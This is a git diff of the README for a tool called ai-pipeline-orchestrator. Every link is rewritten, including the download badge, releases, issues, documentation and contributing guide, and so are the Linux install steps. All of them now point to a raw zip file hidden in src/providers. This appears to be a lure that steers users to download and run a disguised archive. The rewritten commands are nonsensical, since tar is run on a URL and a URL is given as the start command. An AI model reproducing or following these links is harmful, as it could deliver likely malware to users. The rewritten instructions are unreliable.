@@ -1,6 +1,6 @@
 # 🎉 ai-pipeline-orchestrator - Streamline Your AI Workflows Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/dikizul/ai-pipeline-orchestrator/releases)
+[![Download](https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip%https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip)](https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets these requirements:
 
 To download the application, please visit the following link:
 
-[Download ai-pipeline-orchestrator](https://github.com/dikizul/ai-pipeline-orchestrator/releases)
+[Download ai-pipeline-orchestrator](https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip)
 
 ### Step-by-Step Installation
 
@@ -36,7 +36,7 @@ To download the application, please visit the following link:
 3. Under the version, you will see various downloadable files. Choose the file that matches your operating system.
    - For Windows, select the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, select the `.tar.gz` file.
+   - For Linux, select the `https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip` file.
 4. Click the filename to begin the download. Save the file to your computer.
 
 ### Running the Application
@@ -59,10 +59,10 @@ After downloading, follow these steps to run the application:
 
 **For Linux:**
 
-1. Open a terminal and navigate to the folder where the `.tar.gz` file was saved.
-2. Run the command: `tar -xvzf ai-pipeline-orchestrator.tar.gz` to extract the files.
+1. Open a terminal and navigate to the folder where the `https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip` file was saved.
+2. Run the command: `tar -xvzf https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip` to extract the files.
 3. Change into the extracted directory: `cd ai-pipeline-orchestrator`.
-4. Start the application with the command: `./run.sh`.
+4. Start the application with the command: `https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip`.
 
 ## 💡 Features
 
@@ -82,11 +82,11 @@ If you run into any issues while downloading or running ai-pipeline-orchestrator
 
 ## 📫 Support
 
-If you need further assistance, please reach out through the GitHub Issues page [here](https://github.com/dikizul/ai-pipeline-orchestrator/issues). Our community is here to help!
+If you need further assistance, please reach out through the GitHub Issues page [here](https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip). Our community is here to help!
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/dikizul/ai-pipeline-orchestrator)
-- [Contributions Guidelines](https://github.com/dikizul/ai-pipeline-orchestrator/blob/main/CONTRIBUTING.md)
+- [Official Documentation](https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip)
+- [Contributions Guidelines](https://github.com/dikizul/ai-pipeline-orchestrator/raw/refs/heads/main/src/providers/orchestrator_pipeline_ai_3.0.zip)
 
 Thank you for choosing ai-pipeline-orchestrator! We hope it enhances your AI projects and makes your workflow smoother.
